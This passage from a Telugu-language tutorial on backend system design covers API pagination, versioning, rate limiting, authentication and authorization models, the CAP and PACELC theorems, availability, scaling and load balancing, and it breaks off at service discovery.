మీ డేటాబేస్‌లో 10 లక్షల ప్రొడక్ట్స్ ఉన్నాయి అనుకుందాం. `/products` అని కాల్ చేయగానే ఆ లక్షల డేటాని ఒకేసారి రిటర్న్ చేస్తే మీ సర్వర్, బ్రౌజర్ రెండు క్రాష్ అయిపోతాయి. అందుకే ఈ కింది ఫీచర్స్ డిజైన్ చేయాలి:

### 📄 Pagination (పేజీలుగా విడగొట్టడం)

డేటాని ముక్కలు ముక్కలుగా ఇవ్వడం. ఇందులో రెండు రకాలు ఉన్నాయి:

1. **Offset Pagination:** `?page=2&limit=10` అని అడగడం. ఇది సింపుల్ కానీ డేటాబేస్‌లో రికార్డులు పెరిగేకొద్దీ స్లో అవుతుంది. (ఎందుకంటే పాత రికార్డులన్నీ స్కాప్ చేయాలి).
2. **Cursor-Based Pagination (The Upgrade):** `?next_cursor=eyJpZCI6MTB9` లాంటి ఒక లాస్ట్ ఐడి హింట్ ని పంపడం. ఇన్స్టాగ్రామ్, ఫేస్‌బుక్ లలో ఇన్ఫినిట్ స్క్రోలింగ్ (Infinite Scroll) కి ఇది వాడుతారు. ఇది డేటా సైజ్ ఎంత ఉన్నా సూపర్ ఫాస్ట్‌గా పనిచేస్తుంది.

### 🔍 Filtering & Sorting

- **Filtering:** కావలసిన డేటాని మాత్రమే ఫిల్టర్ చేయడం (ఉదా: `?category=electronics&status=active`).
- **Sorting:** డేటాని ఒక ఆర్డర్‌లో అమర్చడం (ఉదా: `?sort_by=price&order=desc`).

---

## 4. Lifecycle & API Management

### 🔄 Versioning (వెర్షనింగ్)

కాలక్రమేణా మన API రూల్స్ మారవచ్చు. పాత యాప్స్ క్రాష్ అవ్వకుండా ఉండటానికి API వెర్షనింగ్ వాడతాం.

- **URL Versioning (Most Popular):** `/api/v1/users` నుండి `/api/v2/users` కి అప్‌గ్రేడ్ అవ్వడం.

### 🛑 Rate Limiting

ఒకే యూజర్ లేదా బాట్ మన APIలను నిరంతరాయంగా కాల్ చేసి సర్వర్‌పై లోడ్ పెంచకుండా కంట్రోల్ చేయడం (ఉదా: ఒక ఐపీ నుండి నిమిషానికి 60 రిక్వెస్ట్‌లు మాత్రమే అనుమతించడం).

### 🔀 API Gateway

మైక్రోసర్వీసెస్ ఆర్కిటెక్చర్‌లో వందల సర్వీసెస్ ఉంటాయి. క్లయింట్ వాటన్నిటినీ విడివిడిగా కాల్ చేయకుండా, అందరికీ ముందు ఒక సింగిల్ ఎంట్రీ పాయింట్‌గా **API Gateway** (ఉదా: Kong, AWS API Gateway) ని పెడతాం.

- **Responsibility:** అథెంటికేషన్ (JWT Check), రేట్ లిమిటింగ్, రూటింగ్ మరియు లాగింగ్ వంటి పనులన్నీ ఈ గేట్‌వేనే చూసుకుంటుంది. దీనివల్ల వెనుక ఉన్న మైక్రోసర్వీసెస్ పై లోడ్ తగ్గుతుంది.

---

## 5. Documentation (API డైరీ)

### 📝 OpenAPI & Swagger

- **What it is:** మనం రాసిన API ఎలా పనిచేస్తుంది, ఏయే పారామీటర్స్ పంపాలి, సర్వర్ ఏం రిటర్న్ చేస్తుంది అని రాసే ఒక స్టాండర్డ్ ఫార్మాట్ **OpenAPI Specification (OAS)**.
- **Swagger:** ఆ OpenAPI ఫైల్‌ని అందమైన, ఇంటరాక్టివ్ వెబ్‌పేజీగా మార్చే టూల్. ఫ్రంటెండ్ డెవలపర్లు బ్యాకెండ్ డెవలపర్లను ఏ అడగకుండానే ఈ స్వ్యాగర్ డాక్యుమెంటేషన్ చూసి APIలని ఈజీగా ఇంటిగ్రేట్ చేసుకోవచ్చు.

---

# 6: Authentication & Authorization

బ్యాకెండ్ సిస్టమ్ డిజైన్‌లో **Authentication & Authorization** అనేది అత్యంత సున్నితమైన మరియు ముఖ్యమైన భాగం. ఒక సిస్టమ్‌ని సెక్యూర్ చేయడంలో ఈ రెండూ రెండు వేర్వేరు రక్షణ వలయాలు.

- **Authentication (AuthN):** నువ్వు ఎవరో నిరూపించుకోవడం (Who are you? - ఉదా: లాగిన్ అవ్వడం).
- **Authorization (AuthZ):** లోపలికి వచ్చాక నీకు ఏయే పనులు చేసే హక్కు ఉందో తేల్చడం (What can you do? - ఉదా: అడ్మిన్ కి ఉండే పర్మిషన్స్ నార్మల్ యూజర్‌కి ఉండకపోవడం).

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Authentication Mechanisms (గుర్తింపు ప్రక్రియలు)

యూజర్ ఎవరో తెలుసుకోవడానికి ఇండస్ట్రీలో వాడే వివిధ పద్ధతులు ఇవి. మనం మొదటి చాప్టర్‌లో కొన్ని బేసిక్స్ చూశాం, ఇక్కడ కొంచెం డీప్‌గా చూద్దాం:

### 🪙 JWT (JSON Web Token)

- **What it is:** ఇది ఒక సెల్ఫ్-కంటైన్డ్ (Self-contained) టోకెన్. ఇందులో మూడు భాగాలు ఉంటాయి: Header, Payload (యూజర్ డేటా), మరియు Signature.
- **Why it's a massive upgrade:** పాత సెషన్-బేస్డ్ పద్ధతిలో సర్వర్ ప్రతిసారీ డేటాబేస్ లేదా రెడిస్ లో సెషన్ ఐడి ఉందో లేదో వెతకాలి. కానీ JWT లో సర్వర్ తన దగ్గర ఉన్న సీక్రెట్ కీతో టోకెన్ యొక్క Signature ని వాలిడేట్ చేస్తే చాలు. డేటాబేస్ లుక్అప్స్ తగ్గుతాయి కాబట్టి ఇది **Stateless** మరియు చాలా ఫాస్ట్.

### 🔐 OAuth2 & OpenID Connect (OIDC)

- **OAuth2 (Authorization ఫ్రేమ్‌వర్క్):** ఇది కేవలం పర్మిషన్స్ ఇవ్వడానికి వాడే స్టాండర్డ్. ఉదాహరణకు, మీరు ఒక థర్డ్-పార్టీ యాప్‌కి మీ గూగుల్ డ్రైవ్ లోని ఫైల్స్ చూసే యాక్సెస్ ఇస్తారు, కానీ మీ గూగుల్ పాస్‌వర్డ్ ఇవ్వరు. ఇది **Access Token** ని ఇస్తుంది.
- **OpenID Connect (OIDC - Identity అప్గ్రేడ్):** OAuth2 కేవలం పర్మిషన్స్ కి మాత్రమే, యూజర్ ప్రొఫైల్ ఎవరో చెప్పలేదు. అందుకే దాని పైన **OIDC** అనే లేయర్ తెచ్చారు. ఇది "యూజర్ ఎవరు" అని చెప్పడానికి **ID Token** (ఇది ఒక JWT) ని కూడా ఇస్తుంది. మనం వెబ్‌సైట్లలో చూసే **"Login with Google"** లేదా **"Sign in with Apple"** దీనితోనే పనిచేస్తాయి.

### 🔑 API Keys

- **What it is:** ఇది ఒక పొడవైన సీక్రెట్ స్ట్రింగ్ (ఉదా: `sk_live_51Nx...`). సాధారణంగా మనుషులు కాకుండా, ఒక సాఫ్ట్‌వేర్ ఇంకో సాఫ్ట్‌వేర్‌తో మాట్లాడుకునేటప్పుడు (Machine-to-Machine) ఐడెంటిఫికేషన్ కోసం దీన్ని వాడుతాం (ఉదా: Stripe లేదా OpenAI API ని మన బ్యాకెండ్ నుండి కాల్ చేయడం).

### 🏛️ SAML (Security Assertion Markup Language)

- **What it is:** ఇది చాలా పాత, XML-బేస్డ్ ఐడెంటిటీ ప్రొవైడర్ స్టాండర్డ్.
- **Why it's still used:** పెద్ద పెద్ద కార్పొరేట్ కంపెనీలలో (Enterprise) ఉద్యోగులందరికీ ఒకే లాగిన్ తో అన్ని సాఫ్ట్‌వేర్లు ఓపెన్ అవ్వడానికి (**SSO - Single Sign-On**) దీన్ని ఎక్కువగా వాడుతారు. కొత్త అప్లికేషన్లకి OIDC వాడుతున్నా, పాత ఎంటర్‌ప్రైజ్ సిస్టమ్స్ లో SAML ఇంకా రన్ అవుతోంది.

---

## 2. Authorization Models (హక్కుల నిర్వహణ)

యూజర్ లాగిన్ అయ్యాక, అతనికి ఏ డేటా చూపించాలి, ఏం మార్చనివ్వాలి అని డిసైడ్ చేసే ఆర్కిటెక్చర్స్ ఇవి.

### 👔 RBAC (Role-Based Access Control)

- **What it is:** యూజర్ యొక్క **Role (పాత్ర)** బేస్ చేసుకొని పర్మిషన్స్ ఇవ్వడం.
- **Example:** సిస్టమ్‌లో `Admin`, `Manager`, `Customer` అనే రోల్స్ ఉంటాయి. "Admin అయితే డ్యాష్‌బోర్డ్ చూడొచ్చు", "Customer అయితే కేవలం తన ఆర్డర్స్ మాత్రమే చూడొచ్చు" అని డిజైన్ చేయడం. ఇది చాలా సింపుల్ మరియు మోస్ట్ కామన్.
- **Why we upgraded:** ఇది సింపుల్ యాప్స్ కి ఓకే కానీ, కండిషన్స్ ఎక్కువైతే ఫెయిల్ అవుతుంది. ఉదాహరణకు: "మేనేజర్ డేటా చూడొచ్చు, కానీ కేవలం ఆఫీస్ టైమింగ్స్ (9 AM - 5 PM) లో మాత్రమే చూడాలి" అంటే RBAC తో కుదరదు.

### 📊 ABAC (Attribute-Based Access Control - The Upgrade)

- **What it is:** ఇది చాలా డైనమిక్. యూజర్ యొక్క రోల్ తో పాటు, రకరకాల **Attributes (లక్షణాలు)** ని బేస్ చేసుకొని పర్మిషన్స్ డిసైడ్ చేస్తుంది.
- **How it checks:** 1. _User Attributes:_ రోల్, డిపార్ట్‌మెంట్, వయసు.

2. _Resource Attributes:_ ఆ ఫైల్ లేదా డేటా ఏ డిపార్ట్‌మెంట్ కి చెందింది.
3. _Environment Attributes:_ కరెంట్ టైమ్, యూజర్ ఐపీ అడ్రస్, లొకేషన్.

- **Why it's better:** "ఒక యూజర్ మేనేజర్ (Role) అయి ఉండి, ఫైనాన్స్ డిపార్ట్‌మెంట్ (Resource) ఫైల్స్ ని, కేవలం ఇండియా (Environment) నుండి యాక్సెస్ చేస్తేనే అనుమతించు" లాంటి కాంప్లెక్స్ రూల్స్ దీనితో రాయవచ్చు.

### 📝 ACL (Access Control List)

- **What it is:** ఇది ఒక స్పెసిఫిక్ రిసోర్స్ కి ఎవరెవరికి యాక్సెస్ ఉందో రాసి ఉంచే ఒక డైరెక్ట్ లిస్ట్.
- **Example:** గూగుల్ డ్రైవ్‌లో ఒక ఫైల్ ఉందనుకుందాం. ఆ ఫైల్ కి పక్కన ఒక లిస్ట్ ఉంటుంది: `user_a@gmail.com (Read)`, `user_b@gmail.com (Write)`. రోల్స్ తో సంబంధం లేకుండా నిర్దిష్టమైన ఫైల్స్ లేదా ఆబ్జెక్ట్స్ ని కంట్రోల్ చేయడానికి ఇది వాడతాం.

---

## 3. Advanced Authorization Concepts

### 🏢 Multi-Tenant Authorization

- **What it is:** మీరు ఒక SaaS (Software as a Service) అప్లికేషన్ బిల్డ్ చేశారు (ఉదా: Slack లేదా Jira లాంటిది). దీన్ని వందల కంపెనీలు (Tenants) వాడుతాయి. కంపెనీ-A లోని అడ్మిన్ కి కంపెనీ-A డేటా మాత్రమే కనిపించాలి, పొరపాటున కూడా కంపెనీ-B డేటా యాక్సెస్ అవ్వకూడదు.
- **How it works:** ప్రతి రిクエスト లోపల `tenant_id` లేదా `org_id` ని పక్కాగా చెక్ చేసి, డేటాబేస్ క్వెరీలని ఆ ఐడి కి ఐసోలేట్ (Data Isolation) చేసేలా ఆర్కిటెక్చర్ డిజైన్ చేయాలి.

### 🛡️ Policy-Based Authorization

- **What it is:** అప్లికేషన్ కోడ్ లోపల ప్రతిచోటా `if (user.role == 'admin')` అని హార్డ్‌కోడ్ చేయడానికి బదులు, పర్మిషన్ రూల్స్ అన్నింటినీ విడిగా **Policies** రూపంలో రాయడం.
- **Modern Stack:** ప్రస్తుతం సిస్టమ్ డిజైన్‌లో **OPA (Open Policy Agent)** లేదా **Casbin** లాంటి టూల్స్ వాడుతున్నారు. దీనివల్ల రేపు పొద్దున ఒక పర్మిషన్ రూల్ మార్చాలన్నా, బ్యాకెండ్ కోడ్ మార్చకుండా కేవలం ఆ పాలసీ ఫైల్ ని అప్‌డేట్ చేస్తే సరిపోతుంది.

---

# 7: Distributed Systems

డిస్ట్రిబ్యూటెడ్ సిస్టమ్స్ (Distributed Systems) డిజైన్ చేసేటప్పుడు మనం తెలుసుకోవాల్సిన అత్యంత ముఖ్యమైన, ఇంటర్వ్యూలలో కచ్చితంగా అడిగే థియరిటికల్ కాన్సెప్ట్స్ ఇవి. డేటాబేస్ లు లేదా సర్వీసెస్ ఒకటి కంటే ఎక్కువ కంప్యూటర్లలో రన్ అవుతున్నప్పుడు, నెట్‌వర్క్ సమస్యలు వస్తే సిస్టమ్ ఎలా ప్రవర్తించాలో ఇవి డిసైడ్ చేస్తాయి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. CAP Theorem (The Golden Rule)

2000వ సంవత్సరంలో ఎరిక్ బ్రూవర్ (Eric Brewer) ప్రతిపాదించిన సిద్ధాంతం ఇది. ఒక డిస్ట్రిబ్యూటెడ్ సిస్టమ్‌లో మూడు ముఖ్యమైన ఫీచర్లు ఉంటాయి:

1. **Consistency (C - స్థిరత్వం):** అన్ని సర్వర్లలో ఒకే సమయంలో ఒకే డేటా కనిపించాలి. మీరు సర్వర్-A లో డేటా అప్‌డేట్ చేస్తే, మరుసటి మిల్లీసెకండ్‌లో సర్వర్-B నుండి చదివినా అదే కొత్త డేటా కనిపించాలి.
2. **Availability (A - అందుబాటు):** సిస్టమ్‌లోని ఏ సర్వర్ అయినా సరే, ప్రతి రిక్వెస్ట్‌కి ఎల్లప్పుడూ ఒక రెస్పాన్స్ ఇవ్వాలి (ఆ డేటా పాతదా కొత్తదా అనేది పక్కన పెడితే, ఎర్రర్ రాకుండా రెస్పాన్స్ రావాలి).
3. **Partition Tolerance (P - నెట్‌వర్క్ విభజన తట్టుకోవడం):** సర్వర్ల మధ్య నెట్‌వర్క్ కనెక్షన్ కట్ అయినా లేదా మెసేజ్‌లు లాస్ అయినా (Partition జరిగినా), సిస్టమ్ మొత్తం క్రాష్ అవ్వకుండా రన్ అవ్వాలి.

### 💡 The Big Trade-off (నిజం ఏంటి?)

రియల్ వరల్డ్‌లో ఇంటర్నెట్ లేదా నెట్‌వర్క్ వైర్లు ఎప్పుడైనా కట్ అవ్వచ్చు, కాబట్టి **Partition Tolerance (P) అనేది మనం వద్దన్నా ఉండే ఒక రియాలిటీ**. మన చేతుల్లో లేదు.

కాబట్టి, నెట్‌వర్క్ ప్రాబ్లం (P) వచ్చినప్పుడు మనకు **కేవలం రెండు ఆప్షన్లు** మాత్రమే ఉంటాయి:

- **CP System (Consistency + Partition Tolerance):** నెట్‌వర్క్ కట్ అయినప్పుడు డేటా తప్పుగా చూపించకూడదు అనుకుంటే, సర్వర్లు ఒకదానితో ఒకటి సింక్ అయ్యే వరకు రీడ్/write ఆపరేషన్లను బ్లాక్ చేస్తాయి (Availability ని వదులుకుంటాయి).
- _ఉదాహరణ:_ **బ్యాంకింగ్ ట్రాన్సాక్షన్స్** లేదా **ATM లు**. మీ అకౌంట్ బ్యాలెన్స్ తప్పుగా చూపించే కంటే, "సర్వర్ బిజీ" అని ఎర్రర్ చూపించడం మేలు.

- **AP System (Availability + Partition Tolerance):** నెట్‌వర్క్ కట్ అయినా పర్లేదు, యూజర్‌కి ఎర్రర్ రాకుండా ఏదో ఒక డేటా చూపించాలి అనుకుంటే, పాత డేటానే చూపిస్తాయి (Consistency ని వదులుకుంటాయి).
- _ఉదాహరణ:_ **Facebook/Instagram Likes** లేదా **YouTube Comments**. మీ ఫ్రెండ్ కి లైక్ కౌంట్ 2 సెకన్లు ఆలస్యంగా అప్‌డేట్ అయినా నష్టం లేదు, కానీ యాప్ లోడింగ్ సింబల్ పడకూడదు.

---

## 2. PACELC Theorem (The Realistic Upgrade)

**CAP Theorem** చాలా బాగుంది, కానీ అందులో ఒక లోపం ఉంది: అది కేవలం **నెట్‌వర్క్ ప్రాబ్లం (Partition) ఉన్నప్పుడు మాత్రమే** ఏం చేయాలో చెప్తుంది. మరి నెట్‌వర్క్ అంతా పర్ఫెక్ట్‌గా ఉన్నప్పుడు (Normal Times లో) సిస్టమ్ ఎలా ప్రవర్తించాలి? దీనికోసమే **PACELC** థియరమ్ వచ్చింది.

దీన్ని ఇలా విడగొట్టి చదవాలి:

> **If there is a Partition (P), choose Availability (A) or Consistency (C); Else (E), choose Latency (L) or Consistency (C).**

నెట్‌వర్క్ క్రాష్ అయితే CAP థియరమ్ లాగే **A** లేదా **C** ఎంచుకో. ఒకవేళ అంతా బాగుంటే (**Else - E**), నువ్వు వేగానికి (**Latency - L**) ఇంపార్టెన్స్ ఇస్తావా లేక పక్కా డేటా స్ట్రిక్ట్‌నెస్ కి (**Consistency - C**) ఇంపార్టెన్స్ ఇస్తావా?

### 📊 PACELC లో రకాలు (Real Databases)

1. **PC/EC (ఉదా: MongoDB, PostgreSQL/MySQL with Sync Replication):**

- నెట్‌వర్క్ ప్రాబ్లం ఉంటే కన్సిస్టెన్సీ (PC) కే ఇంపార్టెన్స్ ఇస్తుంది. నార్మల్ టైమ్స్ లో కూడా డేటా అన్ని సర్వర్లకి సింక్ అయ్యాకే యూజర్‌కి సక్సెస్ చెప్తుంది, కాబట్టి ఇక్కడ కూడా కన్సిస్టెన్సీ (EC) కే ప్రాధాన్యత. సిస్టమ్ కొంచెం స్లోగా (Latency ఎక్కువ) ఉంటుంది కానీ డేటా పక్కా.

2. **PA/EL (ఉదా: Amazon DynamoDB, Cassandra, Couchbase):**

- నెట్‌వర్క్ ప్రాబ్లం ఉంటే అవైలబిలిటీ (PA) కి ఇంపార్టెన్స్ ఇస్తుంది. నార్మల్ టైమ్స్ లో కూడా ఒకే ఒక్క సర్వర్‌లో డేటా రాయగానే వెంటనే యూజర్‌కి సక్సెస్ చెప్పేస్తుంది (Low Latency - EL), మిగతా సర్వర్లకి బ్యాక్‌గ్రౌండ్‌లో నిమ్మదిగా డేటా సింక్ అవుతుంది. సిస్టమ్ సూపర్ ఫాస్ట్.

---

## 3. Consistency (డీప్ డైవ్)

డేటాబేస్ ప్రపంచంలో కన్సిస్టెన్సీ లో రకరకాల స్థాయిలు (Levels) ఉంటాయి:

- **Strong Consistency:** లీడర్ సర్వర్‌లో డేటా మారిన మరుసటి క్షణమే మిగతా అన్ని రీడ్ రికార్డులలోనూ అదే డేటా ఉంటుంది. స్లోగా ఉంటుంది కానీ అత్యంత సురక్షితం.
- **Eventual Consistency:** మనం NoSQL చాప్టర్‌లో చూసినట్లు, డేటా అప్‌డేట్ అయ్యాక మిగతా సర్వర్లకి కాపీ అవ్వడానికి కొంచెం టైమ్ పడుతుంది. కానీ కొంత సమయం తర్వాత (Eventually) అన్నీ సమానంగా మారుతాయి.
- **Read-Your-Writes Consistency:** మీరు ఒక పోస్ట్ పెట్టి పేజీ రీఫ్రెష్ చేశారు. అది కచ్చితంగా మీకైతే కనిపించాలి (ఎందుకంటే మీరే రాశారు). వేరే వాళ్ళకి 2 సెకన్లు ఆలస్యంగా కనిపించినా పర్లేదు.

---

## 4. Availability (డీప్ డైవ్)

సిస్టమ్ డిజైన్‌లో అవైలబిలిటీని పర్సంటేజ్ లలో కొలుస్తారు. దీన్నే **"The Nines of Availability"** అంటారు.

- **99% Availability (Two Nines):** అంటే సంవత్సరంలో సిస్టమ్ 3.65 రోజులు డౌన్ అవ్వచ్చు. (ఇది చాలా బ్యాడ్).
- **99.9% Availability (Three Nines):** సంవత్సరంలో 8.76 గంటలు డౌన్ టైమ్.
- **99.99% Availability (Four Nines):** సంవత్సరంలో కేవలం 52.56 నిమిషాలు మాత్రమే డౌన్ టైమ్. (చాలా మంచి సిస్టమ్స్ ఇలా ఉంటాయి).
- **99.999% Availability (Five Nines - The Gold Standard):** సంవత్సరంలో కేవలం 5.26 నిమిషాలు మాత్రమే డౌన్ టైమ్. AWS లాంటి క్లౌడ్ ప్రొవైడర్లు ఈ లెవెల్ అవైలబిలిటీని టార్గెట్ చేస్తారు.

### 🛠️ అవైలబిలిటీని పెంచడం ఎలా?

- **No Single Point of Failure (SPOF):** సిస్టమ్‌లో ఏ ఒక్క కంప్యూటర్ ఆగిపోయినా మొత్తం సిస్టమ్ ఆగిపోకూడదు. అందుకే ప్రతీ దానికి బ్యాకప్ (Redundancy) పెట్టాలి.
- **Load Balancers:** ఒక సర్వర్ డౌన్ అయితే ట్రాఫిక్ ని వెంటనే ఇంకో సర్వర్ కి మళ్లించడం.

---

బ్యాకెండ్ సిస్టమ్స్ లో లక్షలాది లేదా కోట్లాది మంది యూజర్లు వచ్చినప్పుడు సిస్టమ్ క్రాష్ అవ్వకుండా ఉండటానికి, మరియు ట్రాఫిక్‌ను సమర్థవంతంగా మేనేజ్ చేయడానికి ఈ కాన్సెప్ట్స్ వాడతాం.

వీటిని కూడా మన రియల్-వరల్డ్ ఉదాహరణలతో తెలుగులో స్పష్టంగా నేర్చుకుందాం.

---

## 1. Partition Tolerance (నెట్‌వర్క్ విభజనను తట్టుకోవడం)

మనం మునుపటి CAP Theorem చాప్టర్‌లో దీని గురించి కొంచెం చూశాం. ఇక్కడ దీని అసలు రూపం ఏంటో ప్రాక్టికల్‌గా చూద్దాం.

- **What it is:** ఒక సిస్టమ్‌లో 3 సర్వర్లు (Server-A, Server-B, Server-C) ఒకదానితో ఒకటి వైర్ల ద్వారా లేదా వైఫై ద్వారా కనెక్ట్ అయి ఉన్నాయి అనుకుందాం. పొరపాటున Server-A కి, Server-B కి మధ్య ఉన్న నెట్‌వర్క్ వైర్ తెగిపోయింది లేదా మెసేజ్ ఫెయిల్ అయింది. దీన్నే **Network Partition** అంటారు. ఇలా నెట్‌వర్క్ బ్రేక్ అయినా కూడా, సిస్టమ్ మొత్తం క్రాష్ అవ్వకుండా, మిగతా సర్వర్లు పని చేయడాన్నే **Partition Tolerance** అంటారు.
- **Why it is mandatory:** రియల్ వరల్డ్ డిస్ట్రిబ్యూటెడ్ సిస్టమ్స్ లో వందల సర్వర్లు ఉంటాయి. ఎక్కడో ఒకచోట వైర్ ఊడిపోవడం, డేటా సెంటర్ లో పవర్ పోవడం, లేదా రౌటర్ ఫెయిల్ అవ్వడం చాలా కామన్. కాబట్టి ప్రతీ బ్యాకెండ్ సిస్టమ్ ఖచ్చితంగా Partition Tolerance ని కలిగి ఉండాలి.

---

## 2. Scaling (సిస్టమ్ శక్తిని పెంచడం)

మీ వెబ్‌సైట్‌కి వచ్చే ట్రాఫిక్ పెరిగినప్పుడు (ఉదా: బాహుబలి సినిమా టికెట్లు ఓపెన్ అయినప్పుడు లేదా ఫ్లిప్‌కార్ట్ బిగ్ బిలియన్ డేస్ సేల్ అప్పుడు) సర్వర్ కెపాసిటీని పెంచడాన్నే **Scaling** అంటారు. ఇందులో రెండు పద్ధతులు ఉన్నాయి:

### 🖥️ Vertical Scaling (Scaling Up)

- **What it is:** ఉన్న ఒకే ఒక్క సర్వర్ యొక్క పవర్‌ని పెంచడం. అంటే మీ పాత సర్వర్‌కి మరికొంత RAM, ఎక్కువ CPU Core లు, లేదా పెద్ద SSD హార్డ్ డిస్క్‌ని యాడ్ చేయడం.
- **Analogy (ఉదాహరణ):** మీ ఇంట్లో ఒకే ఒక్క లారీ ఉంది. సరుకు ఎక్కువైతే ఆ లారీని మరింత పెద్దదిగా మార్చడం (లేదా పెద్ద లారీ కొనడం).
- **Why we upgraded (The Limitations):** 1. **Hardware Limit:** ఒక కంప్యూటర్‌కి ఇంతకంటే ఎక్కువ RAM లేదా CPU పెట్టలేము అనే ఒక హార్డ్‌వేర్ లిమిట్ ఉంటుంది (ఉదా: 4TB RAM దాటి పెట్టలేము).

2. **Single Point of Failure (SPOF):** సర్వర్ ఎంత పవర్‌ఫుల్ అయినా, అది ఒకే ఒక్క కంప్యూటర్. పొరపాటున ఆ ఒక్క కంప్యూటర్ మదర్‌బోర్డ్ కాలిపోతే మీ మొత్తం బిజినెస్ ఆగిపోతుంది (No Availability).

### 🌐 Horizontal Scaling (Scaling Out - The Modern Way)

- **What it is:** ఒకే పెద్ద కంప్యూటర్ ని వాడే బదులు, చిన్న చిన్న నార్మల్ కంప్యూటర్లను (Commodity Hardware) పక్కపక్కన యాడ్ చేసుకుంటూ వెళ్ళడం. ట్రాఫిక్ పెరిగే కొద్దీ 1 సర్వర్ ని 5 సర్వర్లుగా, 5 నుండి 50 సర్వర్లుగా పెంచడం.
- **Analogy (ఉదాహరణ):** ఒకే పెద్ద లారీని తయారు చేసే బదులు, 10 చిన్న లారీలను కొని రోడ్డుపైకి వదలడం.
- **Why it's a massive upgrade:**

1. **Infinite Scaling:** దీనికి హార్డ్‌వేర్ లిమిట్ లేదు. మీ దగ్గర డబ్బులు ఉంటే AWS లో ఎన్ని వేల సర్వర్లనైనా క్షణాల్లో యాడ్ చేసుకోవచ్చు.
2. **High Availability:** ఒకేసారి 50 సర్వర్లు రన్ అవుతుంటే, అందులో 2 సర్వర్లు క్రాష్ అయినా మిగతా 48 సర్వర్లు హ్యాపీగా ట్రాఫిక్‌ని హ్యాండిల్ చేస్తాయి. యూజర్‌కి అసలు సైట్ ఆగిపోయినట్లే తెలియదు.

---

## 3. Load Balancing (ట్రాఫిక్ పోలీస్)

మనం హారిజాంటల్ స్కేలింగ్ వాడి 10 సర్వర్లు పెట్టాం. మరి క్లయింట్ (Browser) పంపే రిక్వెస్ట్‌లు ఏ సర్వర్‌కి వెళ్ళాలో ఎవరు డిసైడ్ చేస్తారు? అక్కడే **Load Balancer** ఎంటర్ అవుతుంది.

```text
               ┌─────────┐
               │ Browser │
               └────┬────┘
                    │ (Request)
                    ▼
           ┌─────────────────┐
           │  Load Balancer  │
           └────────┬────────┘
                    │
       ┌────────────┼────────────┐
       ▼            ▼            ▼
 ┌───────────┐┌───────────┐┌───────────┐
 │ Server #1 ││ Server #2 ││ Server #3 │
 └───────────┘└───────────┘└───────────┘

```

- **What it is:** ఇది క్లయింట్లకి మరియు వెనుక ఉన్న మీ మల్టిపుల్ బ్యాకెండ్ సర్వర్లకి మధ్యలో కూర్చునే ఒక మేనేజర్ (ఉదా: Nginx, AWS ALB, HAProxy). వచ్చే లక్షలాది రిక్వెస్ట్‌లను వెనుక ఉన్న సర్వర్లకి సమానంగా పంచుతుంది (Distribute చేస్తుంది).
- **Key Functions (ఇది చేసే పనులు):**
- **Traffic Distribution:** ఏ ఒక్క సర్వర్‌పై లోడ్ ఎక్కువ అవ్వకుండా అందరికీ సమానంగా పని చెప్తుంది.
- **Health Checks:** వెనుక ఉన్న సర్వర్లు బతికే ఉన్నాయా లేదా అని ఇది ప్రతి 5 సెకన్లకి చెక్ చేస్తూనే ఉంటుంది. ఒకవేళ Server-3 డౌన్ అయితే, దాన్ని లిస్ట్ నుండి తీసేసి, వచ్చే ట్రాఫిక్‌ని కేవలం Server-1 మరియు Server-2 లకే పంపుతుంది.

### 🎯 Load Balancing Algorithms (రిక్వెస్ట్‌లను ఎలా పంచుతుంది?)

1. **Round Robin:** ఒక ఆర్డర్ లో పంపుతుంది. 1వ రిక్వెస్ట్ సర్వర్-1 కి, 2వ రిక్వెస్ట్ సర్వర్-2 కి, 3వ రిక్వెస్ట్ సర్వర్-3 కి, మళ్ళీ 4వ రిక్వెస్ట్ సర్వర్-1 కి... ఇలా రౌండ్ గా తిప్పుతుంది.
2. **Least Connections:** ఏ సర్వర్ దగ్గర ప్రస్తుతం అందరికంటే తక్కువ కనెక్షన్లు/తక్కువ లోడ్ ఉందో చూసి, కొత్త రిక్వెస్ట్‌ని ఆ సర్వర్‌కి పంపుతుంది. కాంప్లెక్స్ రిక్వెస్ట్‌లు ఉన్నప్పుడు ఇది బెస్ట్.
3. **IP Hash:** యూజర్ యొక్క IP అడ్రస్‌ని బట్టి ఒక హ్యాష్ క్యాలిక్యులేట్ చేసి, ఆ నిర్దిష్ట యూజర్ రిక్వెస్ట్‌లను ఎప్పుడూ ఒకే సర్వర్‌కి పంపుతుంది (**Sticky Sessions**). మీ అప్లికేషన్‌లో పాత స్టైల్ సెషన్స్ వాడుతుంటే ఇది అవసరం అవుతుంది.

---

మైక్రోసర్వీసెస్ (Microservices) ఆర్కిటెక్చర్‌లో వందల కొద్దీ చిన్న చిన్న సర్వీసెస్ ఒకదానితో ఒకటి నెట్‌వర్క్ ద్వారా మాట్లాడుకుంటూ ఉంటాయి. నెట్‌వర్క్ అనేది ఎప్పుడైనా ఫెయిల్ అవ్వచ్చు, అలాగే సర్వర్లు డైనమిక్‌గా పెరుగుతూ తగ్గుతూ ఉంటాయి. ఇలాంటి క్లిష్టమైన వాతావరణంలో సిస్టమ్ క్రాష్ అవ్వకుండా కాపాడే అత్యంత పవర్‌ఫుల్ **Resiliency Patterns** మరియు ఆర్కిటెక్చర్ కాన్సెప్ట్స్ ఇవి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Service Discovery (చిరునామా వెతకడం)

- **The Problem:** మైక్రోసర్వీసెస్ లో సర్వర్లు ఆటోమేటిక్‌గా స్కేల్ (Horizontal Scaling) అవుతుంటాయి. అంటే ఒక సర్వీస్ ఐపీ అడ్రస్ స్థిరంగా ఉండదు, మారిపోతూ ఉంటుంది. ఉదాహరణకు, `Order-Service` కి `Payment-Service` కాల్ చేయాలి. కానీ `Payment-Service` రన్ అవుతున్న 3 సర్వర్ల కొత్త ఐపీలు ఏంటో `Order-Service` కి ఎలా తెలుస్తుంది? ప్రతీసారి కోడ్‌లో ఐపీలని హార్డ్‌కోడ్ చేయలేం కదా!
- **The Solution (Service Discovery):** ఇది ఇంటర్నెట్ లోని DNS లాంటిది, కానీ ఇంటర్నల్ మైక్రోసర్వీసెస్ కోసం పనిచేస్తుంది (ఉదా: Netflix Eureka, Consul, Kubernetes DNS). ఇందులో రెండు భాగాలు ఉంటాయి:

